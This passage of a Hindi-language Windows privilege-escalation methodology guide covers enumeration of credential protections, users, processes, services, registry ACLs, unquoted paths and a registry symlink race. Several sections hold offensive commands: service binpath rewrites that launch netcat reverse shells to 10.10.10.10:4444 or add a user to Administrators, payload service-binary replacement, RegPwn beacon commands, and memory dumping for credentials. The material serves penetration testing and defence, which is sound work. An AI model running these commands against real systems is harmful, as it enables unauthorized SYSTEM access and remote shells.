```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य किसी डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहाँ उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक उनका उपयोग करते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत security package द्वारा प्रमाणित किया जाता है, तो आमतौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित हो जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की गणना करें

जाँचें कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास रोचक अनुमतियाँ तो नहीं हैं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privileged groups

अगर आप **किसी privileged group के सदस्य हैं, तो आप privileges escalate कर सकते हैं**। Privileged groups और privileges escalate करने के लिए उनका दुरुपयोग कैसे करें, इसके बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** क्या है, इसके बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
**दिलचस्प tokens** के बारे में जानने और उनका दुरुपयोग कैसे करें, इसके लिए अगला पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, processes की सूची बनाते समय **process की command line में passwords खोजें**।\
जाँचें कि क्या आप **चल रहे किसी binary को overwrite कर सकते हैं** या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फ़ायदा उठाने के लिए binary फ़ोल्डर में write permissions हैं:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा जाँचें कि कहीं [**electron/cef/chromium debuggers** चल तो नहीं रहे हैं; आप privileges escalate करने के लिए उनका दुरुपयोग कर सकते हैं](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)।

Debugger listener थोड़े समय के लिए चल सकता है, इसलिए passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी expose नहीं हुआ था। किसी भी दिखे हुए listener को उसके PID, process owner और उस तक पहुँचने की कम-privileged user की क्षमता से correlate करें; केवल application name या debug flag से cross-user code execution स्थापित नहीं होता। Routine enumeration को passive रखें और debugger commands न भेजें।

**Processes के binaries की permissions जाँचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रक्रियाओं की बाइनरी फ़ाइलों वाले फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, `snort.exe -c <config>` से चुनी गई configuration में घोषित `dynamicpreprocessor directory` से shared libraries लोड कर सकता है। यदि कोई scheduled task या service Snort को किसी दूसरे account के तहत चलाती है, तो उसी configuration और घोषित module directory की ACL की जाँच करें। यदि आपका token वहाँ files बना सकता है, तो अगली बार task या service द्वारा modules लोड किए जाने पर उस path में code execution की संभावना की समीक्षा करें। run-as account के प्रभावी privileges, सक्रिय configuration, module compatibility और किसी भी deny या share restriction की पुष्टि करें; केवल writable directory होना privilege escalation साबित नहीं करता। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) runtime module loading का विवरण देता है।

### Writable document root वाली privileged web service

Windows Apache installation में service के executable path और run-as account की तुलना उसकी सक्रिय `httpd.conf` में दिए गए `DocumentRoot` से करें। सामान्य XAMPP layout के लिए `C:\xampp\apache\conf\httpd.conf` और उसके configured document root की ACL जाँचें, जो अक्सर `C:\xampp\htdocs` होता है। यदि कम privileges वाला user उस root में files बना सकता है और Apache `LocalSystem` के रूप में चलता है, तो server-side code execution host privilege boundary पार कर सकता है। पुष्टि करें कि service चल रही है, ठीक वही path serve किया जा रहा है और server-side handler उस file type को process करता है; अकेले writable root से सिर्फ file creation साबित होती है। कोई probe लिखे बिना ACL जाँचें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक पारंपरिक WAMP इंस्टॉलेशन में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout के लिए `C:\wamp\...`) की ओर संकेत कर सकती है; इसकी configuration पास में `conf\httpd.conf` में और default root `C:\wamp64\www` या `C:\wamp\www` हो सकता है। सटीक service image, उसका run-as identity, प्रभावी `DocumentRoot` (जिसमें `${INSTALL_DIR}` का विस्तार और virtual-host overrides शामिल हैं), और root ACL—इन सभी की एक साथ जाँच करें। WAMP directory का writable होना यह साबित नहीं करता कि Apache `SYSTEM` के रूप में चलता है या सबमिट की गई file को execute करता है। [Apache बताता है कि Windows service अपनी configuration कैसे चुनती है](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Writable IIS root और application-pool network identity

IIS में, `applicationHost.config` में किसी writable physical directory को **active site/application** से map करें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखे गए code को pool की identity के तहत तभी चलाया जाता है, जब IIS उस file type को process करे और उस route तक पहुँचा जा सके। Writable directory को code execution मानने से पहले current user's प्रभावी create-file access, site की runtime state, handler और per-path overrides जाँचें।

ASP.NET dynamic compilation की जाँच के लिए एक अलग path भी है: application की compilation directory के अंतर्गत generated files। Default रूप से यह संबंधित .NET Framework installation के नीचे `Temporary ASP.NET Files` directory होती है, लेकिन application का `<compilation tempDirectory>` इसे बदल सकता है। [Microsoft इसका स्थान और प्रति-application subdirectories बताता है](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [जब application pools एक-दूसरे पर भरोसा नहीं करते, तब compilation directories को अलग रखने की सलाह देता है](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)। यदि lower-privileged token किसी **विशिष्ट** application के cache में generated source बदल सकता है, तो पता करें कि क्या वह application इसे अधिक privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के तहत फिर से compile करता है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, प्रभावी token और ACL, compilation settings, process identity और किसी भी recompile के समय के साथ मिलाकर जाँचें। केवल read-only metadata की समीक्षा करें; enumeration के दौरान compilation trigger न करें और cache files न बदलें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool आम तौर पर domain resources पर **host computer account** के रूप में authenticate करता है, भले ही उसका local token कम privileges वाला हो। `LocalSystem` को स्थानीय स्तर पर पहले से ही उच्च privileges प्राप्त होते हैं और वह network पर computer account का उपयोग भी करता है; `LocalService` सामान्यतः anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपने configured account का उपयोग करता है। [Microsoft इन identity types को बताता है](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [application-pool network identity को भी समझाता है](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)। Identity setting न दी गई हो, तो pool defaults लागू हो सकते हैं; ये IIS के अलग-अलग generations में भिन्न होते हैं, इसलिए pool name से अनुमान लगाने के बजाय प्रभावी configuration का पता लगाएँ। यदि code execution ऐसे pool तक पहुँचता है जिसकी network identity computer account है, तो उस **विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights आवश्यक हैं; केवल machine-account ticket या host role से ये rights साबित नहीं होते। Passive enumeration में configuration और ACLs की जाँच करें—कोई file upload किए बिना, network authentication किए बिना और tickets माँगे बिना।

ऐसे readable ASP.NET handler के लिए जो helper process शुरू करता है, authentication, decryption, validation और command construction के दौरान request से प्राप्त हर value को trace करें। `ProcessStartInfo("cmd", "/c ...")` में decoded token को concatenate करने वाला handler shell metacharacters को command बदलने दे सकता है; [Microsoft `cmd` के special characters बताता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)। पहले यह स्थापित करें कि कोई untrusted caller decoded value को वास्तव में प्रभावित कर सकता है और handler तक पहुँच सकता है; फिर प्रभावी application-pool या impersonated identity और child process की identity का पता लगाएँ। केवल readable source line, localhost listener या token-format की कमजोरी से privileged command execution साबित नहीं होता। Passive enumeration के दौरान forged requests भेजे बिना और helper चलाए बिना source और pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request-controlled path जिसे [`include` या `require`](https://www.php.net/manual/en/function.include.php) में पास किया जाता है, worker की identity के तहत lower-user-writable PHP file को evaluate कर सकता है। पुष्टि करें कि request उस statement तक पहुँच सकती है, resolved path ऐसी file का नाम देता है जिसे lower user बदल सकता है और worker पढ़ सकता है, लागू PHP path restrictions include की अनुमति देते हैं, और worker वास्तव में higher privileges के साथ चलता है। केवल loopback listener या writable file से यह chain साबित नहीं होती; passive enumeration के दौरान endpoint invoke किए बिना source, service identity और file ACLs की जाँच करें।

### मेमोरी से पासवर्ड की माइनिंग

आप sysinternals के **procdump** का उपयोग करके चल रही process का memory dump बना सकते हैं। FTP जैसी services के credentials memory में **clear text में** होते हैं; memory dump करने और credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले ऐप्लिकेशन किसी यूज़र को CMD खोलने या डायरेक्टरी ब्राउज़ करने दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

### Privileged project-file import

कोई ऐप्लिकेशन, जो lower-user-writable drop directory से प्रोजेक्ट अपने-आप खोलता है, importer के अकाउंट के तहत एक input trust boundary पार करता है। **सटीक writable path**, उसे खोलने वाली process या task, उसकी effective identity और parser build की समीक्षा करें। [ऐतिहासिक Ghidra project open/restore समस्या](https://github.com/NationalSecurityAgency/ghidra/issues/71) में project metadata के भीतर XML external entities का इस्तेमाल संभव था; यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) इसकी अनुमति देती हैं, तो Windows पर किसी network entity के कारण importing account से authentication हो सकता था। यह credential-exposure का संकेत है, तुरंत administrator access नहीं: उस response का इस्तेमाल करने के लिए अलग से authorized या vulnerable path चाहिए, और मौजूदा builds की जाँच उनकी वास्तविक patch state के आधार पर होनी चाहिए। Passive enumeration के दौरान crafted project न खोलें; import workflow और ACLs की जाँच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` अधिकार](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service पर मिले अधिकारों से अलग होता है। इस अधिकार के लिए सफल, read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) एक जाँच-संकेत है, इस बात का प्रमाण नहीं कि नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसके पास creation के समय माँगे गए service access rights होते हैं; बाद में service को फिर से खोलने पर अलग access check होता है और यह विफल हो सकता है, भले ही मूल handle इस्तेमाल किया जा सकता हो। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग पुष्टि करें। Passive enumeration के दौरान service न बनाएँ और न शुरू करें।

Remote service-install path के लिए, उन SCM rights को target पर ऐसे share के साथ मिलाकर देखें, जिस पर **वही network logon** लिख सकता हो, उसके underlying NTFS ACL और ऐसे local executable path के साथ जिसे service account चला सके। यदि असामान्य रूप से व्यापक SCM rights और file-placement path, दोनों मौजूद हों, तो non-admin account यह boundary पार कर सकता है; administrative share कोई अनिवार्य शर्त नहीं है। केवल share पर write access या केवल SCM create-service का संकेत यह साबित नहीं करता कि नई service किसी higher identity के तहत शुरू हो सकती है।

कोई मौजूदा service startup, shutdown या किसी अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में न हो। यदि helper name को lower-user-writable directory में resolve किया जाता है और service higher identity के तहत चलती है, तो अनुपस्थित helper file को शर्तों के अधीन बदलने की संभावना हो सकती है। **असल service code या documented helper invocation**, resolved executable path और search order, directory बनाने के अधिकार, service identity और उपलब्ध lifecycle trigger की पुष्टि करें। Writable service directory या केवल अनुपस्थित file से यह साबित नहीं होता कि service उस file को load करती है; passive review में service शुरू या बंद न करें।

किसी मौजूदा service के लिए [`SERVICE_START` से `StartService` को arguments दिए जा सकते हैं](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या documented interface की समीक्षा करें। यदि यह caller द्वारा चुने गए argument को log या export path के रूप में इस्तेमाल करती है, तो service identity, argument से write तक का सटीक flow, path restrictions और **बनाई गई file** की permissions जाँचें। Protected directory में write करना तभी escalation बन सकता है, जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; केवल writable log या start right पर्याप्त नहीं है। Passive inventory के दौरान service शुरू न करें और test file न बनाएँ।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` एक **configuration review का संकेत** है: इसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी दूसरी जगह पर redirect कर सकती है। असली service account, WEB listener और access policy की जाँच करें, साथ ही यह भी कि authenticated role settings या scripts बदल सकता है या नहीं। Privileged execution के लिए अतिरिक्त रूप से `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का प्रभावी अधिकार और ऐसा trigger चाहिए जो उसे service identity के तहत चलाए। केवल loopback तक सीमित listener भी local user के लिए reachable हो सकता है, लेकिन केवल file path, password या listener से उन अधिकारों की पुष्टि नहीं होती। Passive enumeration के दौरान secrets दिखाए या web API invoke किए बिना metadata और permissions की समीक्षा करें। [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/) और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/) देखें।

जिस service का `ImagePath` `nssm.exe` हो, उसके लिए service का असली run-as account और उसकी `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value देखें: [NSSM child application को वहाँ store करता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory है। Wrapper की permissions को ही service की पूरी boundary मानने से पहले child executable और उसकी parent-directory ACLs जाँचें। उस child द्वारा expose किया गया local WCF या SOAP endpoint एक अलग जाँच-संकेत है: पुष्टि करें कि lower-privileged user उस listener तक पहुँच सकता है, exact operation उसका input स्वीकार करता है और service child unsafe operation को higher identity के तहत चलाता है। केवल service account, endpoint URL या writable path से escalation साबित नहीं होती; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller द्वारा नियंत्रित string को किसी भी PowerShell runspace तक trace करें। [`Pipeline.Commands.AddScript` script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`Windows transport credentials वाला `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करता है, लेकिन उस **खास** operation को call करने की authorization और runspace की effective identity अलग से जाँची जानी चाहिए। Lower-privileged caller के input से higher service identity के तहत `AddScript` तक जाने वाला path एक code-execution boundary है; केवल listening port, authenticated client या असंबंधित assembly में मौजूद unused method इसका प्रमाण नहीं है। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static समीक्षा करें।

Service Triggers Windows को कुछ स्थितियाँ होने पर service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि)। `SERVICE_START` अधिकार न होने पर भी, आप अक्सर उनके triggers सक्रिय करके privileged services शुरू कर सकते हैं। Enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाले Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है, जो `LocalSystem` के रूप में चलने के लिए configured diagnostic service है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में junction और object-manager-link race का इस्तेमाल करके service DACL reset को redirect किया गया था। प्रदर्शित escalation के लिए एक usable Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी आवश्यक था। यह component जनवरी 2024 में ठीक कर दिया गया था।

Passive triage के लिए, उस service का account और binary path देखें, जाँचें कि Setup WMI compiler path मौजूद है या नहीं और installed component की patch status सत्यापित करें। केवल service entry, Visual Studio product version या compiler file से यह साबित नहीं होता कि host vulnerable है। जाँच के लिए service शुरू करने या repair चलाने की आवश्यकता नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

हर service के लिए आवश्यक privilege level जाँचने हेतु _Sysinternals_ का binary **accesschk** रखना recommended है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जांचने की सलाह दी जाती है कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सर्विस सक्षम करें

अगर आपको यह error मिलता है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_सर्विस शुरू नहीं की जा सकती, क्योंकि यह disabled है या इससे जुड़े कोई enabled devices नहीं हैं।_

आप इसे इस तरह सक्षम कर सकते हैं:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान रखें कि upnphost सेवा को काम करने के लिए SSDPSRV पर निर्भरता होती है (XP SP1 के लिए)**

**इस समस्या का एक अन्य समाधान** यह चलाना है:

```
sc.exe config usosvc start= auto
```

### **service binary path में बदलाव करें**

उस स्थिति में, जहाँ "Authenticated users" group के पास किसी service पर **SERVICE_ALL_ACCESS** हो, service की executable binary में बदलाव करना संभव है। **sc** को modify और execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा पुनः आरंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

विभिन्न permissions के ज़रिए privileges को escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: Service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: Permissions को reconfigure करने की सुविधा देता है, जिससे service configurations बदलना संभव हो जाता है।
- **WRITE_OWNER**: Ownership हासिल करने और permissions को reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: Service configurations बदलने की क्षमता प्राप्त होती है।
- **GENERIC_ALL**: इससे भी service configurations बदलने की क्षमता प्राप्त होती है।

इस vulnerability का पता लगाने और इसका exploitation करने के लिए _exploit/windows/local/service_permissions_ का इस्तेमाल किया जा सकता है।

### Services binaries की कमजोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को replace करके और service को restart करके** उस service को hijack किया जा सकता है।

**जाँचें कि क्या आप service द्वारा चलाए जाने वाले binary को modify कर सकते हैं** या **उस folder पर write permissions हैं** जिसमें binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
आप **wmic** (system32 में नहीं) का इस्तेमाल करके service द्वारा चलाए जाने वाले सभी binaries प्राप्त कर सकते हैं और **icacls** से अपनी permissions जाँच सकते हैं:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs की जाँच करें, खासकर service executable या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`** हों। इसका एक व्यावहारिक दुरुपयोग क्रम यह है:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary लिखने योग्य है।
3. Service binary को payload या किसी वैध malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service को restart करें (या reboot / service trigger का इंतज़ार करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि service किसी सामान्य user को इसे restart करने की अनुमति नहीं देती है, तो जाँचें कि क्या यह boot के समय अपने आप शुरू होती है, इसमें कोई failure action है जो इसे फिर से launch करता है, या इसका उपयोग करने वाला application इसे अप्रत्यक्ष रूप से trigger कर सकता है।

### Services registry modify permissions

जाँचें कि क्या आप किसी service registry को modify कर सकते हैं।\
आप किसी service **registry** पर अपनी **permissions** इस तरह **check** कर सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

जाँचे कि किसी विशेष service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। केवल ACL entry होने से प्रभावी access साबित नहीं होता: deny entries, current token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए एक उपयोगी service configuration field, service को trigger करने का तरीका और अधिक privileged service identity भी आवश्यक हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

चलाए जाने वाले binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race से मनमाने HKLM value में write (ATConfig)

Windows की कुछ Accessibility सुविधाएँ प्रति-यूज़र **ATConfig** keys बनाती हैं, जिन्हें बाद में एक **SYSTEM** process कॉपी करके HKLM session key में लिखता है। Registry में **symbolic link race** के ज़रिए इस privileged write को **किसी भी HKLM path** पर redirect किया जा सकता है, जिससे मनमाने HKLM **value write** की क्षमता मिलती है।<sup>[[18]](#references)</sup>

मुख्य स्थान (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में installed accessibility features की सूची होती है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में यूज़र-नियंत्रित configuration रखी जाती है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और यूज़र इसमें write कर सकता है।

दुरुपयोग का तरीका (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value भरें जिसे आप SYSTEM से लिखवाना चाहते हैं।
2. secure-desktop copy को trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock trigger होने पर **HKLM Session ATConfig** key को हटाकर उसकी जगह protected HKLM target की ओर इंगित करने वाला **registry link** बनाएँ।
4. SYSTEM, redirect किए गए HKLM path पर attacker द्वारा चुनी गई value लिखता है।

मनमाने HKLM value में write की क्षमता मिलने के बाद, service configuration values को overwrite करके LPE करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे सामान्य यूज़र start कर सकता हो (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **ध्यान दें:** public exploit implementation race के हिस्से के रूप में **workstation को lock** करता है।

उदाहरण tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

अगर आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, **arbitrary code execute करने के लिए इतना काफी है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

अगर executable का path quotes के अंदर नहीं है, तो Windows space से पहले खत्म होने वाले हर path को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows इन paths को execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

बिल्ट-इन Windows services से संबंधित paths को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
